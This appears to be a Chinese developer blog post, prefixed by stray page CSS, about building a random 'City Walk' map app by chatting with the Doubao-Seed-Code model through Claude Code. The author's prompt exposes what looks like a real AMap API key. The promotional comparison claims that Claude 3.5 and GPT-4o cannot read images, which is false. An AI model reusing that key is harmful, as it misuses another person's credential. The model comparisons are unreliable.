h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>“City Walk”太费腿？那就让AI替你走一遍。</p>
<p>本文记录我如何用 Doubao-Seed-Code —— 国内首个具备原生视觉理解能力的AI编程模型，把一张手绘草图变成一个可交互的“电子城市漫步”应用。全程零代码基础，仅靠对话完成编程。</p>
</blockquote>
<h2 data-id="heading-0">一.背景</h2>
<p>“City Walk”——城市漫步，曾是年轻人逃离内卷的诗意解药：绿灯直行、红灯拐弯、路口掷骰子、遇见小店就进去坐坐，拍一百张照片，只为记录一条无人知晓的小巷。它不为打卡，只为“瞎溜达”。</p>
<p>但对我这种能坐绝不站、能躺绝不坐的懒人来说：</p>
<blockquote>
<p>“走1公里，拍100张照，找3家店，最后发现没带充电宝。”</p>
</blockquote>
<p>于是，我灵机一动：为什么不做一个“电子版City Walk”？如果有合适的，我在出门。</p>
<p>不用出门，打开网页，点击“开始漫步”，AI就带着我在城市里“瞎溜达”——绿灯直行、红灯拐弯、路口掷骰子，还能推荐路边的宝藏咖啡馆和涂鸦墙。</p>
<p><strong>左侧为草稿图，右侧为使用 Doubao-Seed-Code 编程的效果。</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a69fc864a7fa4330a1f6fa084f542e82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=54PL8nhxi1pNscge7vTPmH4FN%2Fc%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aff6156f64d2449db1321e02160c7c98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=ChSNdl0BzZPns%2FAWtjgTcOUQ8ew%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">二.相关介绍</h2>
<h3 data-id="heading-2"><strong>工具选择：为什么是 Doubao-Seed-Code？</strong></h3>
<p>Doubao-Seed-Code 是一款专为 "Agentic Coding"任务深度优化的全新代码模型。它为真实的、复杂的编程任务而设计，在长上下文理解、任务规划、代码生成与调试方面均有卓越表现。</p>
<p>我试过多个主流AI编程模型（Claude 3.5、GPT-4o、GLM-4、DeepSeek-Coder），但它们要么：</p>
<ul>
<li>❌ 无法理解图片（只能靠文字描述）</li>
<li>❌ 生成的界面五花八门，完全偏离草图</li>
<li>❌ 需要手动拆解“地图+随机路线+骰子+POI推荐”等复杂逻辑，效率极低</li>
</ul>
<p>直到我发现了 <strong>火山引擎的 Doubao-Seed-Code</strong>。</p>
<p><strong>✅ 它的三大杀手锏，直接击中我的痛点：</strong></p>

























<table><thead><tr><th>能力</th><th>普通模型</th><th>Doubao-Seed-Code</th></tr></thead><tbody><tr><td>视觉理解</td><td>❌ 依赖OCR/文本转述（信息丢失）</td><td>✅ 原生VLM，直接看图写代码，0损失</td></tr><tr><td>长上下文</td><td>通常≤32K</td><td>✅ 256K，整项目代码+图片+需求全塞进去</td></tr><tr><td>成本</td><td>业内均价高</td><td>✅ 综合成本低62.7%，首月9.9元起</td></tr></tbody></table>
<blockquote>
<p><strong>关键点：</strong> 它不是“能看图”，而是<strong>真正理解图中的布局、交互、语义关系</strong>——比如我草图里左下角的“骰子”和“向右喝咖啡”，它知道那是两个独立的交互模块，不是随便画的装饰。</p>
</blockquote>
<hr/>
<h2 data-id="heading-3"><strong>三.全程“对话式开发”</strong></h2>
<h3 data-id="heading-4">前置准备</h3>
<p>虽然使用的是Doubao-Seed-Code这个国内首个具备视觉理解能力的编程模型，但是这在他的人家官方公司，我们没办法直接用，所以可以通过 Claude Code去调用 Doubao-Seed-Code ，另外，在火山方舟平台也是提供API调用。</p>
<blockquote>
<p><strong>仅需 5s 在Claude Code 丝滑接入 Doubao-Seed-Code</strong></p>
</blockquote>
<p>在启动 Claude Code 前输入环境变量（以Windows为例）：</p>
<pre><code class="hljs language-arduino" lang="arduino">setx ANTHROPIC_AUTH_TOKEN ARK_API_KEY
setx ANTHROPIC_BASE_URL https:<span class="hljs-comment">//ark.cn-beijing.volces.com/api/coding</span>
setx ANTHROPIC_MODEL doubao-seed-code-preview-latest
</code></pre>
<p>📌注意：换为你自己的，来这里获取 -&gt; <a href="https://link.juejin.cn?target=https%3A%2F%2Fconsole.volcengine.com%2Fark%2Fregion%3Aark%2Bcn-beijing%2Fapikey" target="_blank" title="https://console.volcengine.com/ark/region:ark+cn-beijing/apikey" ref="nofollow noopener noreferrer">console.volcengine.com/ark/region:…</a></p>
<p>📚如果有不会的地方可以看官方教程来配置：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.volcengine.com%2Fdocs%2F82379%2F1928262" target="_blank" title="https://www.volcengine.com/docs/82379/1928262" ref="nofollow noopener noreferrer">www.volcengine.com/docs/82379/…</a></p>
<p>真消费才敢说真话。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/acf59beee6ae4940912711c67333dcdd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=sHIxwZMG%2Bbltr%2Fp8ngumHKvoYOU%3D" alt="" loading="lazy"/></p>
<p>使用指令导航到指定目录，并启动claude:</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">C:\Users\18432&gt; D:</span>
<span class="hljs-section">D:&gt; cd 目标</span>
<span class="hljs-section">D:\目标&gt;claude</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eba4feaf691342a2a8157fa0a5edbf8f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=IrkU%2Fie85gq2x9TDtqvLcyk%2BnK0%3D" alt="" loading="lazy"/></p>
<p>可以看到如图所示成功启动并使用Doubao-Seed-Code模型， 兼容了原本的 Anthropic API，对于使用Claude Code的开发者，几乎零成本 将 API 切换到 Doubao-Seed-Code，完全无缝，像换了“引擎”，但方向盘还是原来的。</p>
<h3 data-id="heading-5">🖼️ 图片理解测评</h3>
<p>听说 Doubao-Seed-Code 是国内首个具备视觉理解能力的编程模型，我直接把我本次的草稿图直接给了他，看他理解的怎么样？</p>
<p>草稿图原图（其中有多个地名为干扰选项）</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/869f153a727643f1803b234fdcef6cae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=3Gst%2BwxElNsjpYt7WXGkXDq3g5g%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e426509bdfc34509b3f5d263b671864a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=MLJbNaT2xlkq0TJnIZMADOEvkaQ%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>💡 不是“猜”出来的，是“看懂”了。</p>
</blockquote>
<p>VLM训练需要专业团队和数据积累，有一定技术壁垒，doubao 系列模型一直以来视觉理解能力非常强，Seed-Code 模型保持了这个优势，在国内，要么模型不具备视觉理解能力，要么需要依赖MCP实现，将图片转化成语义描述供模型理解，过程中消耗token，效果远不及原生VLM能力，项目开发，只有真正的理解，才能大幅提升前端开发效率。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c960a813ba14963a0265d3c9d4a97d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=pWEMg1GbeKiALmUW6LyeKQOL3G0%3D" alt="" loading="lazy"/></p>
<p><strong>下面是端到端模型训练的下游指标评测结果：</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47ff0aea0afd4fa999801ac78b1d7eda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=ZpW8pyLyOrI2nTEVMdmVa1nnyto%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">📌 实战 AI 开发</h3>
<p>直接把下面的提示词扔给他</p>
<pre><code class="hljs">请帮我设计并生成一个“电子版City Walk”项目方案。规则如下：
1.项目简介：
电子版City Walk基于“瞎溜达”理念，模拟城市漫无目的漫步。
遵循“绿灯直行，红灯拐弯，遇路口随机选择方向”的逻辑生成步行路线。
路线生成结合兴趣点推荐，重点推介小众有趣的咖啡馆、小店、街头艺术等。
用户可以线上“电子走一遍”这条路线，查看地图和沿途店铺景点卡片。
支持路线保存、复盘和分享。
2.主要功能需求：
地图展示与交互（基于高德基础地图API，直接使用我的API： fdda8428fc94）：显示地图、起点、动态路线与兴趣点标记。
起点选取与定位功能：自动定位或手动选择起点城市和具体位置。
路线生成规则：结合步行路径规划API和随机决策算法，实现仿真“红绿灯”及“猜拳”路口选择。
沿途兴趣点推荐模块，智能筛查高评分非连锁商店和特色地点。
电子City Walk模拟导航，用户可点击“下一步”体验虚拟行走过程。
路线生成后自动生成图文路线作品，支持用户收藏和分享。
后续拓展包括路线评价、个性化推荐和自然语言描述。
3.技术架构
采用前后端分离的方式去写代码，后端用Python代码，地图展示与交互（基于高德基础地图API，直接使用我的API： fdda8428fc9485f355b24b1c76f6f147）
4.草稿图如附件（（仅为例子，全部具体实现））
背景是当前的位置，会根据高德自动找到前方路口，选择路线会出现的兴趣点推荐
左下角展示（仅为例子，你具体实现）：
本次随机的结果
向右可以喝咖啡(咖啡的特色）
向左可以吃烧烤（这家烧烤..…..网上的具体评价等）
右下角展示
一个随机展示筛子
绿灯直行，红灯拐弯（筛子左右）
</code></pre>
<p>第一次生成的效果如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28c0a9ac172e4d7a94d42438820fb9cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=MgZ4WUye%2F04R5nhJYsl6KOdXxos%3D" alt="" loading="lazy"/></p>
<p>虽然没有具体使用高德，但是在这个的布局上和我的草稿没有什么区别。</p>
<h3 data-id="heading-7">迭代：多轮对话，越聊越准</h3>
<p><strong>为让效果更好，我们多尝试、跟模型多轮对话，效果好于一次性对话</strong></p>
<p>接下来就是漫长的迭代~</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d883ec09369846c19438ab13e09f5ee2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=pSHraAYKrOTvIZvtgP78kMHcyFY%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>第一次生成的版本，骰子是静态图片。我说：“让它能转起来，像真骰子一样。”</p>
</blockquote>
<p>它立刻改成了CSS动画 + JS随机数控制。</p>
<blockquote>
<p>我说：“咖啡馆的推荐文案太假了，要真实评价。”</p>
</blockquote>
<p>它从网络抓取了真实用户对“北京胡同咖啡馆”的点评，自动生成了3条风格迥异的文案。</p>
<blockquote>
<p>我说：“能不能加个‘暂停’按钮？”</p>
</blockquote>
<p>它加了，还顺手做了个“进度条”和“已走距离”。</p>
<p>全程无代码干预，纯对话。</p>
<p>看看最终效果吧~</p>
<p><strong>左侧为草稿图，右侧为使用 Doubao-Seed-Code 编程的效果。</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6914de27aeee47ebb4896cdc0230b43d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=MCBYV4DnXKUuf%2FawWvtne4VbnvU%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d755fb0654140d08141d5b6dbfd6712~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764600460&amp;x-signature=AXdJbe5QKWiveM6pOWN094EBrlY%3D" alt="" loading="lazy"/></p>
<p>下面是生成的README.md的文件，准确的识别了图片，以及分析图片所描述的功能等。</p>
<pre><code class="hljs language-markdown" lang="markdown"> # 电子城市盲盒 - 随机城市漫步导航应用

<span class="hljs-section">## 项目简介</span>

电子城市盲盒是一款创新的城市漫步导航应用，通过随机路线生成和交互式导航，让用户体验充满惊喜的城市探索之旅。用户只需选择起点，系统将随机生成一条充满未知的路线，并在旅途中提供实时导航、兴趣点推荐和随机事件（如红绿灯决策），使每次漫步都充满新鲜感。

<span class="hljs-section">## 核心功能</span>

<span class="hljs-section">### 🎲 随机路线生成</span>
<span class="hljs-bullet">-</span> 基于起点位置智能生成1-5公里的随机探索路线
<span class="hljs-bullet">-</span> 结合高德地图API实现真实道路导航
<span class="hljs-bullet">-</span> 支持路径随机化，每次生成不同的探索体验

<span class="hljs-section">### 🚦 交互式决策系统</span>
<span class="hljs-bullet">-</span> 基于骰子结果的红绿灯决策机制
<span class="hljs-bullet">-</span> 提供多种可能的行进方向选择
<span class="hljs-bullet">-</span> 增强游戏化体验和探索趣味性

